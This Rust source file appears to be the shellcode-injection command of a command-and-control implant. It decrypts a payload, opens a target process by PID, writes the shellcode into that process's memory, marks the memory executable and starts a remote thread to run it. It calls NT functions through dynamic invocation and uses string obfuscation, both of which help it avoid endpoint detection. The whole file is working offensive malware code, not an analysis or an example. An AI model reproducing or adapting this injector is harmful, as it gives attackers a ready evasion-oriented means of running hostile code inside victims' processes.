use crate::internal::dinvoke::{
    nt_allocate_virtual_memory, nt_create_thread_ex, nt_open_process, nt_protect_virtual_memory,
    nt_write_virtual_memory,
};
use crate::internal::{client::Client, debug::debug_println};
use dinvoke_rs::data::PAGE_EXECUTE_READ;
use fmtools::format; // using obfstr to obfuscate
use windows_sys::Wdk::Foundation::OBJECT_ATTRIBUTES;
use windows_sys::Win32::Foundation::CloseHandle;
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
use windows_sys::Win32::System::Threading::{PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS};
use windows_sys::Win32::System::WindowsProgramming::CLIENT_ID;

pub(crate) fn shinject(args: &[String], client: &Client) -> String {
    let (pid, encrypted_shellcode) = match args.len() {
        2 if !args[0].is_empty() && !args[1].is_empty() => {
            let pid = match args[0].parse::<isize>() {
                Ok(pid) => pid,
                Err(e) => return format!("Failed to parse PID: "{e}),
            };
            let encrypted_shellcode = &args[1];
            (pid, encrypted_shellcode)
        }
        _ => {
            return format!(
                "Invalid number of arguments received. Usage: 'shinject [PID] [localfilepath]'."
            )
        }
    };

    // Decrypt the shellcode
    let shellcode = match client.decrypt_and_decompress(encrypted_shellcode) {
        Ok(shellcode) => shellcode,
        Err(e) => return format!("Failed to decrypt shellcode: "{e}),
    };

    // DInvoke: Call NtOpenProcess
    let mut process_handle: isize = 0;
    let mut client_id = CLIENT_ID {
        UniqueProcess: pid,
        UniqueThread: 0,
    };
    let mut object_attributes: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
    let ret = nt_open_process(
        std::ptr::from_mut(&mut process_handle),
        PROCESS_ALL_ACCESS,
        std::ptr::from_mut(&mut object_attributes),
        std::ptr::from_mut(&mut client_id),
    );

    if ret != 0 {
        return format!("Failed to open process: "{ret:#X});
    }
    debug_println!("Opened process: {pid}");

    // DInvoke: Call NtAllocateVirtualMemory
    let ba = usize::default();
    let base_address: *mut *mut std::ffi::c_void =
        std::ptr::from_ref::<usize>(&ba) as *mut *mut std::ffi::c_void;
    let dwsize = shellcode.len();
    let size: *mut usize = (std::ptr::from_ref::<usize>(&dwsize)).cast_mut();
    let ret = nt_allocate_virtual_memory(
        process_handle,
        base_address,
        0,
        size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    if ret != 0 {
        return format!("Failed to allocate memory: "{ret:#X});
    }
    debug_println!("Allocated memory at: {:#X}", ba);

    // DInvoke: Call NtWriteVirtualMemory
    let mut bytes_written: usize = 0;
    let ret = nt_write_virtual_memory(
        process_handle,
        ba as *mut std::ffi::c_void,
        shellcode.as_ptr() as *mut std::ffi::c_void,
        shellcode.len(),
        std::ptr::from_mut(&mut bytes_written),
    );

    if ret != 0 {
        return format!("Failed to write memory: "{ret:#X});
    }
    debug_println!("Wrote {bytes_written} bytes to memory");

    // DInvoke: Call NtProtectVirtualMemory
    let mut old_protect = 0;
    let ret = nt_protect_virtual_memory(
        process_handle,
        base_address,
        size,
        PAGE_EXECUTE_READ,
        std::ptr::from_mut(&mut old_protect),
    );

    if ret != 0 {
        return format!("Failed to protect memory: "{ret:#X});
    }
    debug_println!("Changed memory protection RX");

    // DInvoke: Call NtCreateThreadEx
    let mut thread_handle: isize = 0;
    let ret = nt_create_thread_ex(
        &mut thread_handle,
        THREAD_ALL_ACCESS,
        std::ptr::null_mut(),
        process_handle,
        ba as *mut std::ffi::c_void,
        std::ptr::null_mut(),
        0,
        0,
        0,
        0,
        std::ptr::null_mut(),
    );

    if ret != 0 {
        return format!("Failed to create thread: "{ret:#X});
    }
    debug_println!("Created thread: {thread_handle}");

    unsafe {
        CloseHandle(thread_handle);
        CloseHandle(process_handle);
    }
    debug_println!("Closed handles");

    format!("Injected shellcode into process: "{pid})
}
